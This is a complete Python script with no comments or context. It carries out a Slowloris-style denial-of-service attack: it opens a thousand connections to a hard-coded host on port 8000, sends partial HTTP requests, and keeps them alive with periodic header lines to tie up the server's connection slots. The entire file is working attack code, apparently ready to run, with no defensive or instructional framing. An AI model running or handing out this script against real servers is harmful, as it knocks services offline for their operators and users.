import socket
import time
import threading

TARGET = "10.0.101.71"
PORT = 8000
SOCKETS = []

def create_slow_connections(count):
    for _ in range(count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET, PORT))
            s.send(b"GET / HTTP/1.1\r\nHost: target\r\n")
            SOCKETS.append(s)
        except:
            pass

create_slow_connections(1000)

while True:
    for s in list(SOCKETS):
        try:
            s.send(b"X-Header: keep-alive\r\n")
        except:
            SOCKETS.remove(s)
    time.sleep(10)